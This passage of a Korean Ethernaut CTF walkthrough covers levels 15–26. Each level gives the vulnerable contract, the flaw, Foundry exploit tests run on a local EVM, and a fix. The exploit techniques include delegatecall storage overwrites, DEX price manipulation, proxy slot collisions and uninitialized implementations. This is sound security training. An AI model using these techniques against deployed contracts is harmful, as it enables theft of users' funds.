        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

</details>

#### 코드 분석

`transfer()`만 시간 잠금으로 막혀 있고 ERC-20의 `approve()`와 `transferFrom()`은 살아 있다. 자신 또는 공격 컨트랙트에 allowance를 주고 전체 잔고를 이동한다. 토큰 제약은 모든 이동 경로에 같은 정책을 적용해야 한다.

#### 풀이 과정

1. approve 후 transferFrom으로 transfer에만 걸린 lockTokens modifier를 우회한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        NaughtCoinAttack attacker = new NaughtCoinAttack();
        instance.approve(address(attacker), instance.balanceOf(player));
        attacker.attack(address(instance), player);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 15 Naught Coin 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-15-naught-coin.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

모든 토큰 이동 경로에 동일한 정책을 적용한다.

### Level 16 — Preservation

#### 문제 설명과 목표

라이브러리 storage 충돌로 owner를 덮는다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Preservation.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

</details>

#### 코드 분석

라이브러리 호출이 `delegatecall`인데 대상과 라이브러리의 storage layout이 다르다. 첫 호출로 slot 0의 라이브러리 주소를 공격 라이브러리로 바꾸고, 두 번째 호출로 slot 2의 owner를 덮는다.

#### 풀이 과정

1. 첫 delegatecall로 library 주소를 공격 컨트랙트로 바꾸고 두 번째 호출로 slot 2 owner를 기록한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        PreservationAttack attacker = new PreservationAttack();
        instance.setFirstTime(uint256(uint160(address(attacker))));
        instance.setFirstTime(uint256(uint160(address(player))));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 16 Preservation 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-16-preservation.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

delegatecall 라이브러리의 layout을 고정하고 검증한다.

### Level 17 — Recovery

#### 문제 설명과 목표

잃어버린 SimpleToken 주소를 찾아 ETH를 회수한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Recovery.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

</details>

#### 코드 분석

잃어버린 SimpleToken 주소를 생성자 주소와 nonce로 다시 계산한다. 첫 `CREATE`라면 `keccak256(rlp.encode([creator, 1]))`의 마지막 20바이트다. 주소를 찾은 뒤 `destroy(player)`로 ETH를 회수한다.

#### 풀이 과정

1. creator와 nonce 1을 RLP 인코딩해 CREATE 주소를 계산하고 destroy를 호출한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player, player);

        address payable lostContract = payable(
            address(
                uint160(
                    uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01))))
                )
            )
        );

        SimpleToken(lostContract).destroy(player);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 17 Recovery 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-17-recovery.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

배포 주소와 자산을 이벤트·레지스트리로 추적한다.

### Level 18 — MagicNumber

#### 문제 설명과 목표

10바이트 이하 runtime으로 42를 반환한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>MagicNum.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNum {
    address public solver;

    constructor() {}

    function setSolver(address _solver) public {
        solver = _solver;
    }

    /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
    */
}
```

</details>

#### 코드 분석

Solidity 없이 10바이트 이하의 runtime bytecode가 42를 반환해야 한다. `602a60005260206000f3`는 42를 메모리 0에 저장하고 32바이트를 반환한다. 이 runtime을 돌려주는 creation bytecode로 solver를 배포한다.

#### 풀이 과정

1. PUSH1 0x2a, MSTORE, RETURN으로 구성한 runtime과 이를 반환하는 creation code를 배포한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        MagicNumSolver solver = new MagicNumSolver();
        instance.setSolver(address(solver));
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 18 MagicNumber 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-18-magicnumber.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

임의 bytecode를 신뢰 경계 안에 두지 않는다.

### Level 19 — Alien Codex

#### 문제 설명과 목표

동적 배열 인덱스로 owner slot을 덮는다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>AlienCodex.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

</details>

#### 코드 분석

구버전 배열 길이를 언더플로시켜 전체 storage를 배열처럼 접근한다. 동적 배열 시작점 `keccak256(slot)`에서 slot 0까지 되감는 인덱스를 계산해 owner가 들어 있는 packed slot을 덮는다.

#### 풀이 과정

1. 배열 길이를 언더플로시킨 뒤 keccak256(slot)에서 slot 0으로 되감는 index를 계산해 player를 기록한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player, player);

        new AlienCodexExploit().exploit(address(instance));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 19 Alien Codex 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-19-alien-codex.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

배열 길이 산술과 storage 접근을 checked 상태로 유지한다.

### Level 20 — Denial

#### 문제 설명과 목표

withdraw가 항상 가스 부족으로 실패하게 한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Denial.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

</details>

#### 코드 분석

withdraw 과정에서 partner에게 모든 가스를 넘긴다. partner를 무한 루프나 과도한 가스 소비 컨트랙트로 지정하면 owner 지급까지 도달하지 못한다. 신뢰하지 않는 외부 호출 실패가 핵심 로직을 막지 않게 해야 한다.

#### 풀이 과정

1. partner를 가스를 소진하는 컨트랙트로 지정해 후속 owner 송금을 막는다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        DenialAttack denialAttack = new DenialAttack();
        instance.setWithdrawPartner(address(denialAttack));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 20 Denial 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-20-denial.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

외부 호출 실패를 핵심 지급 흐름과 분리한다.

### Level 21 — Shop

#### 문제 설명과 목표

100 미만 가격으로 물건을 산다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Shop.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

</details>

#### 코드 분석

구매자가 구현한 `price()`를 상태 변경 전후 두 번 호출한다. 첫 호출에는 100, `isSold`가 true가 된 두 번째 호출에는 0을 반환해 100 미만 가격으로 판매되게 한다. Elevator와 마찬가지로 외부 조회 결과의 일관성을 가정한 문제다.

#### 풀이 과정

1. price의 첫 호출은 100, isSold 변경 뒤 두 번째 호출은 0을 반환한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        ShopAttack attacker = new ShopAttack();
        attacker.attack(instance);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 21 Shop 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-21-shop.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

외부 가격을 한 번만 읽고 로컬 값으로 검증·정산한다.

## 6. Level 22–27: AMM, 프록시, 탐지 봇

### Level 22 — Dex

#### 문제 설명과 목표

두 준비금 중 하나를 0으로 만든다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Dex.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

</details>

#### 코드 분석

가격식이 현재 두 토큰 잔고의 단순 비율이다.

```solidity
return (amount * IERC20(to).balanceOf(address(this))) /
       IERC20(from).balanceOf(address(this));
```

토큰 1과 2를 번갈아 전량 스왑하면 반올림과 변하는 현물 비율 때문에 한쪽 준비금이 0이 된다. 외부 조작이 쉬운 spot balance만 가격 오라클처럼 쓰면 안 된다.

#### 풀이 과정

1. 현재 잔고 비율 가격식을 이용해 token1과 token2를 번갈아 전량 swap한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        SwappableToken token1 = SwappableToken(instance.token1());
        SwappableToken token2 = SwappableToken(instance.token2());

        token1.approve(address(instance), 200);
        token2.approve(address(instance), 200);
        instance.swap(address(token1), address(token2), 10);

        instance.swap(address(token2), address(token1), 20);
        instance.swap(address(token1), address(token2), 24);
        instance.swap(address(token2), address(token1), 30);
        instance.swap(address(token1), address(token2), 41);
        instance.swap(address(token2), address(token1), 45);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 22 Dex 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-22-dex.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

검증된 AMM 불변식과 TWAP를 사용한다.

### Level 23 — Dex Two

#### 문제 설명과 목표

두 정상 토큰 준비금을 모두 고갈시킨다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>DexTwo.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

</details>

#### 코드 분석

허용 토큰인지 검사하지 않아 직접 만든 토큰도 스왑 입력으로 받는다. 가짜 토큰을 Dex에 조금 보내 가격식을 만든 뒤 두 정상 토큰을 각각 전부 빼냈다.

#### 풀이 과정

1. 가짜 토큰을 만들고 Dex에 seed를 보낸 뒤 같은 가짜 토큰으로 두 정상 자산을 swap한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        SwappableTokenTwo token1 = SwappableTokenTwo(instance.token1());
        SwappableTokenTwo token2 = SwappableTokenTwo(instance.token2());

        DexTwoAttackToken attack = new DexTwoAttackToken();
        instance.swap(address(attack), address(token1), 1);
        instance.swap(address(attack), address(token2), 1);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 23 Dex Two 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-23-dex-two.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

입출력 토큰 allowlist를 검증한다.

### Level 24 — Puzzle Wallet

#### 문제 설명과 목표

프록시 admin을 플레이어로 바꾼다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>PuzzleWallet.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

</details>

#### 코드 분석

프록시와 구현체의 슬롯이 충돌한다. `pendingAdmin`과 `owner`가 slot 0, `admin`과 `maxBalance`가 slot 1을 함께 쓴다. `proposeNewAdmin(player)`로 wallet owner가 되고, 중첩 `multicall`로 같은 `msg.value`를 두 번 입금 처리해 잔고를 비운 다음 `setMaxBalance(uint160(player))`로 admin을 덮는다.

#### 풀이 과정

1. slot 충돌로 owner가 되고 중첩 multicall로 msg.value를 이중 계상해 잔고를 비운 뒤 maxBalance로 admin을 덮는다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        PuzzleProxy(payable(address(instance))).proposeNewAdmin(player);

        instance.addToWhitelist(player);

        bytes[] memory callsDeep = new bytes[](1);
        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
        instance.multicall{value: 0.001 ether}(calls);

        instance.execute(player, 0.002 ether, "");
        instance.setMaxBalance(uint256(uint160(address(player))));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 24 Puzzle Wallet 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-24-puzzle-wallet.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

EIP-1967 슬롯과 upgrade-safe layout을 사용한다.

### Level 25 — Motorbike

#### 문제 설명과 목표

Engine 구현을 장악한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Motorbike.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

</details>

#### 코드 분석

프록시가 아닌 구현 컨트랙트 Engine을 직접 찾아 초기화하고 upgrader가 된다. 악성 구현으로 업그레이드하면서 과거에는 `selfdestruct`로 코드를 제거했다. 다만 Dencun의 EIP-6780 이후 이전 트랜잭션에서 만든 컨트랙트의 코드는 지워지지 않아 Sepolia 판정이 깨질 수 있다. 로컬 테스트가 통과하더라도 현재 체인 규칙과 레벨 검증식의 불일치를 별도로 확인해야 한다.

#### 풀이 과정

1. EIP-1967 구현 슬롯을 읽고 구현체를 직접 initialize한 뒤 악성 구현으로 upgradeToAndCall한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);
        assertTrue(submitLevelInstance(ethernaut, instance));
    }
```

#### 풀이 완료 확인

![Level 25 Motorbike 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-25-motorbike.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

implementation 생성자에서 initializers를 비활성화한다.

### Level 26 — DoubleEntryPoint

#### 문제 설명과 목표

vault의 DET 이동을 Forta로 차단한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>DoubleEntryPoint.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
    mapping(address => IDetectionBot) public usersDetectionBots;
    mapping(address => uint256) public botRaisedAlerts;

    function setDetectionBot(address detectionBotAddress) external override {
        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
    }

    function notify(address user, bytes calldata msgData) external override {
        if (address(usersDetectionBots[user]) == address(0)) return;
        try usersDetectionBots[user].handleTransaction(user, msgData) {
            return;
        } catch {}
    }

    function raiseAlert(address user) external override {
        if (address(usersDetectionBots[user]) != msg.sender) return;
        botRaisedAlerts[msg.sender] += 1;
    }
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if (forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(address to, uint256 value, address origSender)
        public
        override
        onlyDelegateFrom
        fortaNotify
        returns (bool)
    {
        _transfer(origSender, to, value);
        return true;
    }
}
```

</details>

#### 코드 분석

LegacyToken의 `delegateTransfer()` 경로로 underlying DET가 빠져나가는 것을 Forta bot으로 감지한다. `msgData`에서 원래 송신자를 디코딩하고 vault에서 시작된 delegate transfer면 `raiseAlert(user)`를 호출한다. 래퍼 토큰은 실제 자산 이동 경로까지 감시해야 한다.

#### 풀이 과정

1. delegateTransfer selector와 origSender를 디코딩하는 DetectionBot을 등록하고 vault 출금 시 alert를 올린다.

#### 익스플로잇 / 검증 코드

```solidity
